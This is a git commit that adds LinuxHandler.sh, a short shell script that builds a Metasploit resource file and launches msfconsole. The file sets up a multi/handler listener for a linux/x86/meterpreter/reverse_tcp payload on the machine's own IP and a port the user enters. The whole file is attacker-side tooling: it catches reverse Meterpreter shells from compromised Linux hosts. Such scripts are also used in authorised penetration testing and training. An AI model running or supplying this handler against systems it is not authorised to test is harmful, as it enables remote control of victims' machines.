6bf9546028b124140462bbca78c08ecef50dcb01
Falcon Rising <chinnidiwakar5@gmail.com>
2020-08-16 13:38:31 +0530

    Create LinuxHandler.sh

---
+++ LinuxHandler.sh
@@ -0,0 +1,12 @@
+IP=$(hostname -I)
+echo "Enter Your LPORT Number: "
+read PORT
+echo "IP BEING USED   : $IP"
+echo "PORT BEING USED : $PORT"
+echo "use multi/handler" > /tmp/handler.rc
+echo "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> /tmp/handler.rc
+echo "set LHOST $IP" >> /tmp/handler.rc
+echo "set LPORT $PORT" >> /tmp/handler.rc
+echo "exploit" >> /tmp/handler.rc
+service postgresql start
+msfconsole -q -r /tmp/handler.rc
